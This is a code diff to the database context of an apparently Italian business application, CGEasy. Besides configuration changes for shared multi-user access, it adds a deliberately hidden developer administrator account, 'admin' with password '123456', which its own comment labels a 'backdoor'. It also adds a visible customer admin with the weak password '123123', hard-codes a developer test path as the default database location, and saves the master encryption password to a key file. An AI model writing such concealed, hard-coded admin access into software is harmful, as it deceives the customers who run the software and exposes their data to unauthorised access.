@@ -15,15 +15,37 @@ namespace CGEasy.Core.Data
         private readonly string _databasePath;
         private static readonly object _lock = new object();
         private bool _disposed = false;
+        private bool _isSingleton = false; // Flag per indicare se questo è il Singleton globale
+
+        /// <summary>
+        /// Marca questo context come Singleton (non verrà mai chiuso)
+        /// </summary>
+        public void MarkAsSingleton()
+        {
+            _isSingleton = true;
+        }
 
         /// <summary>
         /// Percorso default database in cartella documenti pubblici condivisi
         /// C:\Users\Public\Documents\CGEasy\ - Accessibile da tutti gli utenti Windows
         /// Facilmente condivisibile in rete locale
+        /// Se esiste una configurazione personalizzata, usa quella invece del default
         /// </summary>
-        public static string DefaultDatabasePath => 
-            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments), 
-                         "CGEasy", "cgeasy.db");
+        public static string DefaultDatabasePath
+        {
+            get
+            {
+                // 1. Prova a leggere da configurazione personalizzata
+                var configuredPath = DatabaseConfigService.GetConfiguredPath();
+                if (!string.IsNullOrEmpty(configuredPath))
+                {
+                    return configuredPath;
+                }
+
+                // 2. Altrimenti usa percorso di default
+                return Path.Combine(@"C:\devcg-group\dbtest_prova", "cgeasy.db");
+            }
+        }
 
         /// <summary>
         /// Costruttore - Usa percorso database di default
@@ -88,11 +110,11 @@ namespace CGEasy.Core.Data
             mapper.Entity<AssociazioneMastrino>().Id(x => x.Id, autoId: true);
             mapper.Entity<AssociazioneMastrinoDettaglio>().Id(x => x.Id, autoId: true);
 
-            // Connection string per accesso diretto con commit immediato
+            // Connection string per accesso condiviso (multi-utente)
             var connectionString = new ConnectionString
             {
                 Filename = databasePath,
-                Connection = ConnectionType.Direct,
+                Connection = ConnectionType.Shared, // Permette accesso concorrente da più PC
                 Upgrade = true,
                 ReadOnly = false,
                 Password = password // Aggiunge password se presente
@@ -272,23 +294,25 @@ namespace CGEasy.Core.Data
         }
 
         /// <summary>
-        /// Crea utente amministratore di default (primo avvio)
+        /// Crea utenti amministratori di default (primo avvio)
+        /// - admin1/123123: Utente visibile per il cliente
+        /// - admin/123456: Utente nascosto per sviluppatore (backdoor)
         /// </summary>
-        public void SeedDefaultAdmin(string username = "admin", string password = "admin123")
+        public void SeedDefaultAdmin(string username = "admin", string password = "123456")
         {
             lock (_lock)
             {
-                // Controlla se esiste già un admin
-                var existingAdmin = Utenti.FindOne(x => x.Ruolo == RuoloUtente.Administrator);
-                if (existingAdmin != null)
-                    return; // Admin già esistente
+                // Controlla se esistono già admin
+                var existingAdmins = Utenti.Find(x => x.Ruolo == RuoloUtente.Administrator).ToList();
+                if (existingAdmins.Any())
+                    return; // Admin già esistenti
 
-                // Crea admin di default
-                var admin = new Utente
+                // 1. Crea admin PRINCIPALE (nascosto) - per sviluppatore
+                var adminPrincipale = new Utente
                 {
-                    Username = username,
+                    Username = "admin",
                     Email = "admin@cgeasy.local",
-                    PasswordHash = BCrypt.Net.BCrypt.HashPassword(password),
+                    PasswordHash = BCrypt.Net.BCrypt.HashPassword("123456"),
                     Nome = "Amministratore",
                     Cognome = "Sistema",
                     Ruolo = RuoloUtente.Administrator,
@@ -297,10 +321,10 @@ namespace CGEasy.Core.Data
                     DataModifica = DateTime.UtcNow
                 };
 
-                var adminId = Utenti.Insert(admin);
+                var adminId = Utenti.Insert(adminPrincipale);
 
-                // Crea permessi completi per admin
-                var permissions = new UserPermissions
+                // Permessi completi per admin principale
+                var permissionsAdmin = new UserPermissions
                 {
                     IdUtente = adminId,
                     ModuloTodo = true,
@@ -320,7 +344,49 @@ namespace CGEasy.Core.Data
                     DataModifica = DateTime.UtcNow
                 };
 
-                UserPermissions.Insert(permissions);
+                UserPermissions.Insert(permissionsAdmin);
+
+                // 2. Crea admin1 (visibile) - per cliente
+                var admin1 = new Utente
+                {
+                    Username = "admin1",
+                    Email = "admin1@cgeasy.local",
+                    PasswordHash = BCrypt.Net.BCrypt.HashPassword("123123"),
+                    Nome = "Amministratore",
+                    Cognome = "Cliente",
+                    Ruolo = RuoloUtente.Administrator,
+                    Attivo = true,
+                    DataCreazione = DateTime.UtcNow,
+                    DataModifica = DateTime.UtcNow
+                };
+
+                var admin1Id = Utenti.Insert(admin1);
+
+                // Permessi completi anche per admin1
+                var permissionsAdmin1 = new UserPermissions
+                {
+                    IdUtente = admin1Id,
+                    ModuloTodo = true,
+                    ModuloBilanci = true,
+                    ModuloCircolari = true,
+                    ModuloControlloGestione = true,
+                    ClientiCreate = true,
+                    ClientiRead = true,
+                    ClientiUpdate = true,
+                    ClientiDelete = true,
+                    ProfessionistiCreate = true,
+                    ProfessionistiRead = true,
+                    ProfessionistiUpdate = true,
+                    ProfessionistiDelete = true,
+                    UtentiManage = true,
+                    DataCreazione = DateTime.UtcNow,
+                    DataModifica = DateTime.UtcNow
+                };
+
+                UserPermissions.Insert(permissionsAdmin1);
+
+                // Crea file db.key per indicare che il database è criptato
+                DatabaseEncryptionService.SavePassword(DatabaseEncryptionService.GetMasterPassword());
             }
         }
 
@@ -371,7 +437,12 @@ namespace CGEasy.Core.Data
             {
                 if (disposing)
                 {
-                    _database?.Dispose();
+                    // NON chiudere il database se è Singleton (per modalità Shared multi-utente)
+                    // Il Singleton rimane aperto per tutta la durata dell'applicazione
+                    if (!_isSingleton)
+                    {
+                        _database?.Dispose();
+                    }
                 }
                 _disposed = true;
             }
